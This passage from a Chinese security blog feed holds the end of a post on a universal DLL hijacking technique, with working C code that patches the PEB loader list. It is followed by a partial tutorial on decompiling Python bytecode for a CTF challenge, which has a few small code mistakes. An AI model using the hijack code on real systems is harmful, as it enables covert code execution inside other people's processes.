x64系统中，ntdll的关键代码如下所示。差别是LdrpLoadDll直接返回的ldrentry，而不是BaseAddress，在LdrpLoadDll内部流程基本和reactos一致。所以方案应该可行，后续验证确实证明可行。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall LdrLoadDll()</span><br><span class="line">&#123;</span><br><span class="line">v11 = LdrpLoadDll(v5, v9, v10, 1, 0i64, &amp;dataentry);</span><br><span class="line">  v12 = v11;</span><br><span class="line">  if ( v11 &gt;= 0 )</span><br><span class="line">    *dllbase = dataentry-&gt;DllBase;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h2 id="尝试实现"><a href="#尝试实现" class="headerlink" title="尝试实现"></a>尝试实现</h2><p>实现其实非常简单，关键代码如下所示。两部分代码，一个是加载原始dll模块（mydll.dll.1）拿到真是的模块句柄hMod（基地址），第二个就是遍历peb-&gt;ldr找到mydll.dll的ldrentry，然后修改dllbase为hMod。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">void* NtCurrentPeb()</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">  mov eax, fs:[0x30];</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">PEB_LDR_DATA* NtGetPebLdr(void* peb)</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">  mov eax, peb;</span><br><span class="line">  mov eax, [eax + 0xc];</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line"> WCHAR wszDllName[100] = &#123; 0 &#125;;</span><br><span class="line"> void* peb = NtCurrentPeb();</span><br><span class="line"> PEB_LDR_DATA* ldr = NtGetPebLdr(peb);</span><br><span class="line"></span><br><span class="line"> for (LIST_ENTRY* entry = ldr-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">  entry != (LIST_ENTRY*)(&amp;ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">  entry = entry-&gt;Blink) &#123;</span><br><span class="line">  PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry;</span><br><span class="line"></span><br><span class="line">  memset(wszDllName, 0, 100 * 2);</span><br><span class="line">  memcpy(wszDllName, data-&gt;BaseDllName.Buffer, data-&gt;BaseDllName.Length);</span><br><span class="line"></span><br><span class="line">  if (!_wcsicmp(wszDllName, dllname)) &#123;</span><br><span class="line">   data-&gt;DllBase = hMod;</span><br><span class="line">   break;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID DllHijack(HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line"> TCHAR tszDllPath[MAX_PATH] = &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line"> GetModuleFileName(hMod, tszDllPath, MAX_PATH);</span><br><span class="line"> PathRemoveFileSpec(tszDllPath);</span><br><span class="line"> PathAppend(tszDllPath, TEXT(&quot;mydll.dll.1&quot;));</span><br><span class="line"></span><br><span class="line"> HMODULE hMod1 = LoadLibrary(tszDllPath);</span><br><span class="line"></span><br><span class="line"> SuperDllHijack(L&quot;mydll.dll&quot;, hMod1);</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        DllHijack(hModule);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经测试在win7 x84和win10 x64中即是有效的，其他系统未测试，如果有问题，请留言或自行解决。</p> <p>害怕这种方案不行，还想了另一种思路，在dllmain中hook LdrpLoadDll的返回调用地址处，修改dataentry的值，因为LdrLoadDll函数接口固定，所以这种方式也应该是通用的，不过实现起来其实还比现在的麻烦些，所以只是保留了这种思路，并未去实现验证，留给爱折腾的朋友吧。</p> <p>最后，代码上传了github，<a href="https://github.com/anhkgg/SuperDllHijack" target="_blank" rel="noopener">https://github.com/anhkgg/SuperDllHijack</a></p> <p>转载请注明出处：<a href="https://anhkgg.com/dllhijack/" target="_blank" rel="noopener">https://anhkgg.com/dllhijack/</a></p> <p>公众号文章链接：<a href="https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg</a></p> <p>欢迎关注公众号：<strong>汉客儿</strong>或加入QQ交流群：<strong>753894145</strong></p> ]]></content>          <summary type="html">            &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;&lt;span style=&quot;color:red&quot;&gt;汉客儿&lt;/span&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/img/wx.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;通用DLL劫持技术研究&lt;br&gt;&lt;br&gt;by anhkgg&lt;br&gt;&lt;br&gt;2018年11月29日&lt;br&gt;&lt;/p&gt; &lt;/blockquote&gt; &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;Dll劫持相信大家都不陌生，理论就不多说了。Dll劫持的目的一般都是为了自己的dll模块能够在别人进程中运行，然后做些不可描述的事情。&lt;/p&gt; &lt;p&gt;为了让别人的程序能够正常运行，通常都需要在自己的dll中导出和劫持的目标dll相同的函数接口，然后在自己的接口函数中调用原始dll的函数，如此使得原始dll的功能能够正常被使用。导出接口可以自己手工写，也可以通过工具自动生成，比如著名的&lt;code&gt;Aheadlib&lt;/code&gt;。这种方法的缺点就是针对不同的dll需要导出不同的接口，虽然有工具帮助，但也有限制，比如不支持x64。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="dllhijack" scheme="https://anhkgg.github.io/tags/dllhijack/"/>            <category term="windows" scheme="https://anhkgg.github.io/tags/windows/"/>        </entry>      <entry>     <title>死磕python字节码-手工还原python源码（网鼎杯第四场逆向题chaoyang）</title>     <link href="https://anhkgg.github.io/python-bytecode/"/>     <id>https://anhkgg.github.io/python-bytecode/</id>     <published>2018-09-04T15:21:29.000Z</published>     <updated>2018-09-04T15:29:08.761Z</updated>          <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1.前言"></a>0x1.前言</h2><blockquote> <p>Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。<br>Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。</p> </blockquote> <a id="more"></a> <p><code>dis.dis()</code>将CPython字节码转为可读的伪代码(类似于汇编代码)。结构如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line"></span><br><span class="line">9          12 LOAD_FAST                1 (local1)</span><br><span class="line">           15 PRINT_ITEM</span><br><span class="line">           16 LOAD_FAST                0 (arg1)</span><br><span class="line">           19 PRINT_ITEM</span><br><span class="line">           20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">           23 PRINT_ITEM</span><br><span class="line">           24 PRINT_NEWLINE</span><br><span class="line">           25 LOAD_CONST               0 (None)</span><br><span class="line">           28 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>其实就是这样的结构：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</span><br></pre></td></tr></table></figure> <h2 id="0x2-变量"><a href="#0x2-变量" class="headerlink" title="0x2.变量"></a>0x2.变量</h2><h3 id="1-const"><a href="#1-const" class="headerlink" title="1.const"></a>1.const</h3><p><code>LOAD_CONST</code>加载<code>const</code>变量，比如数值、字符串等等，一般用于传给函数的参数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">55       12 LOAD_GLOBAL              1 (test)</span><br><span class="line">         15 LOAD_FAST                0 (2) #读取2</span><br><span class="line">         18 LOAD_CONST               1 (&apos;output&apos;) </span><br><span class="line">         21 CALL_FUNCTION            2</span><br></pre></td></tr></table></figure> <p>转为python代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(2, &apos;output&apos;)</span><br></pre></td></tr></table></figure> <h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2.局部变量"></a>2.局部变量</h3><p><code>LOAD_FAST</code>一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。<br><code>STORE_FAST</code>一般用于保存值到局部变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">61          77 LOAD_FAST                0 (n)</span><br><span class="line">             80 LOAD_FAST                3 (p)</span><br><span class="line">             83 INPLACE_DIVIDE</span><br><span class="line">             84 STORE_FAST               0 (n)</span><br></pre></td></tr></table></figure> <p>这段bytecode转为python就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = n / p</span><br></pre></td></tr></table></figure> <p>函数的形参也是局部变量，如何区分出是函数形参还是其他局部变量呢？</p> <p>形参没有初始化，也就是从函数开始到<code>LOAD_FAST</code>该变量的位置，如果没有看到<code>STORE_FAST</code>，那么该变量就是函数形参。</p> <p>而其他局部变量在使用之前肯定会使用<code>STORE_FAST</code>进行初始化。</p> <p>具体看下面的实例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">4           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">5           6 LOAD_FAST                1 (local1)</span><br><span class="line">            9 PRINT_ITEM</span><br><span class="line">           10 LOAD_FAST                0 (arg1)</span><br><span class="line">           13 PRINT_ITEM</span><br><span class="line">           14 PRINT_NEWLINE</span><br><span class="line">           15 LOAD_CONST               0 (None)</span><br><span class="line">           18 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>对应的python代码如下，对比一下就一目了然。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def test(arg1):</span><br><span class="line">    local1 = 0</span><br><span class="line">    print local1, arg1</span><br></pre></td></tr></table></figure> <h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3.全局变量"></a>3.全局变量</h3><p><code>LOAD_GLOBAL</code>用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p> <p><code>STORE_GLOBAL</code>用来给全局变量赋值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line">            20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">            23 PRINT_ITEM</span><br></pre></td></tr></table></figure> <p>对应的python代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def test():</span><br><span class="line">    global global1</span><br><span class="line">    global1 = 101</span><br><span class="line">    print global</span><br></pre></td></tr></table></figure> <h2 id="0x3-常用数据类型"><a href="#0x3-常用数据类型" class="headerlink" title="0x3.常用数据类型"></a>0x3.常用数据类型</h2><h3 id="1-list"><a href="#1-list" class="headerlink" title="1.list"></a>1.list</h3><p><code>BUILD_LIST</code>用于创建一个list结构。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">             3 LOAD_CONST               2 (2)</span><br><span class="line">             6 BUILD_LIST               2</span><br><span class="line">             9 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure> <p>对应python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = [1, 2]</span><br></pre></td></tr></table></figure> <p>另外再看看一种常见的创建list的方式如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in xlist if x!=0 ]</span><br></pre></td></tr></table></figure> <p>一个实例bytecode如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22         235 BUILD_LIST               0 //创建list，为赋值给某变量，这种时候一般都是语法糖结构了</span><br><span class="line">           238 LOAD_FAST                3 (sieve)</span><br><span class="line">           241 GET_ITER</span><br><span class="line">       &gt;&gt;  242 FOR_ITER                24 (to 269)</span><br><span class="line">           245 STORE_FAST               4 (x)</span><br><span class="line">           248 LOAD_FAST                4 (x)</span><br><span class="line">           251 LOAD_CONST               2 (0)</span><br><span class="line">           254 COMPARE_OP               3 (!=)</span><br><span class="line">           257 POP_JUMP_IF_FALSE      242 //不满足条件contine</span><br><span class="line">           260 LOAD_FAST                4 (x)//读取满足条件的x</span><br><span class="line">           263 LIST_APPEND              2 //把每个满足条件的x存入list</span><br><span class="line">           266 JUMP_ABSOLUTE          242</span><br><span class="line">       &gt;&gt;  269 RETURN_VALUE</span><br></pre></td></tr></table></figure> <p>转为python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[for x in sieve if x != 0]</span><br></pre></td></tr></table></figure> <h3 id="2-dict"><a href="#2-dict" class="headerlink" title="2.dict"></a>2.dict</h3><p><code>BUILD_MAP</code>用于创建一个空的dict。<code>STORE_MAP</code>用于初始化dict的内容。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">13           0 BUILD_MAP                1</span><br><span class="line">             3 LOAD_CONST               1 (1)</span><br><span class="line">             6 LOAD_CONST               2 (&apos;a&apos;)</span><br><span class="line">             9 STORE_MAP</span><br><span class="line">            10 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure> <p>对应的python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = &#123;&apos;a&apos;: 1&#125;</span><br></pre></td></tr></table></figure> <p>再看看修改dict的bytecode：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">14          13 LOAD_CONST               3 (2)</span><br><span class="line">             16 LOAD_FAST                0 (k)</span><br><span class="line">             19 LOAD_CONST               4 (&apos;b&apos;)</span><br><span class="line">             22 STORE_SUBSCR</span><br></pre></td></tr></table></figure> <p>对应的python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k[&apos;b&apos;] = 2</span><br></pre></td></tr></table></figure> <h3 id="3-slice"><a href="#3-slice" class="headerlink" title="3.slice"></a>3.slice</h3><p><code>BUILD_SLICE</code>用于创建slice。对于list、元组、字符串都可以使用slice的方式进行访问。</p> <p>但是要注意<code>BUILD_SLICE</code>用于[x:y:z]这种类型的slice，结合<code>BINARY_SUBSCR</code>读取slice的值，结合<code>STORE_SUBSCR</code>用于修改slice的值。</p> <p>另外<code>SLICE+n</code>用于[a:b]类型的访问，<code>STORE_SLICE+n</code>用于[a:b]类型的修改，其中<code>n</code>表示如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SLICE+0()</span><br><span class="line">Implements TOS = TOS[:].</span><br><span class="line"></span><br><span class="line">SLICE+1()</span><br><span class="line">Implements TOS = TOS1[TOS:].</span><br><span class="line"></span><br><span class="line">SLICE+2()</span><br><span class="line">Implements TOS = TOS1[:TOS].</span><br><span class="line"></span><br><span class="line">SLICE+3()</span><br><span class="line">Implements TOS = TOS2[TOS1:TOS].</span><br></pre></td></tr></table></figure> <p>下面看具体实例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">              3 LOAD_CONST               2 (2)</span><br><span class="line">              6 LOAD_CONST               3 (3)</span><br><span class="line">              9 BUILD_LIST               3</span><br><span class="line">             12 STORE_FAST               0 (k1) //k1 = [1, 2, 3]</span><br><span class="line"></span><br><span class="line"> 14          15 LOAD_CONST               4 (10)</span><br><span class="line">             18 BUILD_LIST               1</span><br><span class="line">             21 LOAD_FAST                0 (k1)</span><br><span class="line">             24 LOAD_CONST               5 (0)</span><br><span class="line">             27 LOAD_CONST               1 (1)</span><br><span class="line">             30 LOAD_CONST               1 (1)</span><br><span class="line">             33 BUILD_SLICE              3</span><br><span class="line">             36 STORE_SUBSCR                    //k1[0:1:1] = [10]</span><br><span class="line"></span><br><span class="line"> 15          37 LOAD_CONST               6 (11)</span><br><span class="line">             40 BUILD_LIST               1</span><br><span class="line">             43 LOAD_FAST                0 (k1)</span><br><span class="line">             46 LOAD_CONST               1 (1)</span><br><span class="line">             49 LOAD_CONST               2 (2)</span><br><span class="line">             52 STORE_SLICE+3                   //k1[1:2] = [11]</span><br><span class="line"></span><br><span class="line"> 16          53 LOAD_FAST                0 (k1)</span><br><span class="line">             56 LOAD_CONST               1 (1)</span><br><span class="line">             59 LOAD_CONST               2 (2)</span><br><span class="line">             62 SLICE+3</span><br><span class="line">             63 STORE_FAST               1 (a)  //a = k1[1:2]</span><br><span class="line"></span><br><span class="line"> 17          66 LOAD_FAST                0 (k1)</span><br><span class="line">             69 LOAD_CONST               5 (0)</span><br><span class="line">             72 LOAD_CONST               1 (1)</span><br><span class="line">             75 LOAD_CONST               1 (1)</span><br><span class="line">             78 BUILD_SLICE              3</span><br><span class="line">             81 BINARY_SUBSCR</span><br><span class="line">             82 STORE_FAST               2 (b) //b = k1[0:1:1]</span><br></pre></td></tr></table></figure> <h2 id="0x4-循环"><a href="#0x4-循环" class="headerlink" title="0x4.循环"></a>0x4.循环</h2><p><code>SETUP_LOOP</code>用于开始一个循环。<code>SETUP_LOOP              26 (to 35)</code>中<code>35</code>表示循环退出点。</p> <h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) // i=0</span><br><span class="line"></span><br><span class="line">24           6 SETUP_LOOP              26 (to 35)</span><br><span class="line">       &gt;&gt;    9 LOAD_FAST                0 (i) //循环起点</span><br><span class="line">            12 LOAD_CONST               2 (10)</span><br><span class="line">            15 COMPARE_OP               0 (&lt;)</span><br><span class="line">            18 POP_JUMP_IF_FALSE       34     //while i &lt; 10:</span><br><span class="line"></span><br><span class="line">25          21 LOAD_FAST                0 (i)</span><br><span class="line">            24 LOAD_CONST               3 (1)</span><br><span class="line">            27 INPLACE_ADD                     </span><br><span class="line">            28 STORE_FAST               0 (i) // i += 1</span><br><span class="line">            31 JUMP_ABSOLUTE            9    // 回到循环起点</span><br><span class="line">       &gt;&gt;   34 POP_BLOCK</span><br><span class="line">       &gt;&gt;   35 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure> <p>对应python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">    while i &lt; 10:</span><br><span class="line">        i += 1</span><br></pre></td></tr></table></figure> <h3 id="for-in结构"><a href="#for-in结构" class="headerlink" title="for in结构"></a>for in结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    238 LOAD_FAST                3 (sieve)#sieve是个list</span><br><span class="line">    241 GET_ITER                    //开始迭代sieve</span><br><span class="line">&gt;&gt;  242 FOR_ITER                24 (to 269) //继续iter下一个x</span><br><span class="line">    245 STORE_FAST               4 (x)</span><br><span class="line">    ...</span><br><span class="line">    266 JUMP_ABSOLUTE          242 //循环</span><br></pre></td></tr></table></figure> <p>这是典型的for+in结构，转为python代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in sieve:</span><br></pre></td></tr></table></figure> <h2 id="0x5-if"><a href="#0x5-if" class="headerlink" title="0x5.if"></a>0x5.if</h2><p><code>POP_JUMP_IF_FALSE</code>和<code>JUMP_FORWARD</code>一般用于分支判断跳转。<code>POP_JUMP_IF_FALSE</code>表示条件结果为<code>FALSE</code>就跳转到目标偏移指令。<code>JUMP_FORWARD</code>直接跳转到目标偏移指令。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) //i=0</span><br><span class="line">24           6 LOAD_FAST                0 (i)</span><br><span class="line">             9 LOAD_CONST               2 (5)</span><br><span class="line">            12 COMPARE_OP               0 (&lt;)</span><br><span class="line">            15 POP_JUMP_IF_FALSE       26</span><br><span class="line"></span><br><span class="line">25          18 LOAD_CONST               3 (&apos;i &lt; 5&apos;)</span><br><span class="line">            21 PRINT_ITEM</span><br><span class="line">            22 PRINT_NEWLINE</span><br><span class="line">            23 JUMP_FORWARD            25 (to 51)</span><br><span class="line"></span><br><span class="line">26     &gt;&gt;   26 LOAD_FAST                0 (i)</span><br><span class="line">            29 LOAD_CONST               2 (5)</span><br><span class="line">            32 COMPARE_OP               4 (&gt;)</span><br><span class="line">            35 POP_JUMP_IF_FALSE       46</span><br><span class="line"></span><br><span class="line">27          38 LOAD_CONST               4 (&apos;i &gt; 5&apos;)</span><br><span class="line">            41 PRINT_ITEM</span><br><span class="line">            42 PRINT_NEWLINE</span><br><span class="line">            43 JUMP_FORWARD             5 (to 51)</span><br><span class="line"></span><br><span class="line">29     &gt;&gt;   46 LOAD_CONST               5 (&apos;i = 5&apos;)</span><br><span class="line">            49 PRINT_ITEM</span><br><span class="line">            50 PRINT_NEWLINE</span><br><span class="line">       &gt;&gt;   51 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure> <p>转为python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">if i &lt; 5:</span><br><span class="line">    print &apos;i &lt; 5&apos;</span><br><span class="line">elif i &gt; 5:</span><br><span class="line">    print &apos;i &gt; 5&apos;</span><br><span class="line">else:</span><br><span class="line">    print &apos;i = 5&apos;</span><br></pre></td></tr></table></figure> <h2 id="0x6-分辨函数"><a href="#0x6-分辨函数" class="headerlink" title="0x6.分辨函数"></a>0x6.分辨函数</h2><h3 id="1-函数范围"><a href="#1-函数范围" class="headerlink" title="1.函数范围"></a>1.函数范围</h3><p>前面介绍第二列表示指令在函数中的偏移地址，所以看到0就是函数开始，下一个0前一条指令就是函数结束位置，当然也可以通过<code>RETURN_VALUE</code>来确定函数结尾</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">54         0 LOAD_FAST                1 (plist) //函数开始</span><br><span class="line">           3 LOAD_CONST               0 (None)</span><br><span class="line">           6 COMPARE_OP               2 (==)</span><br><span class="line">           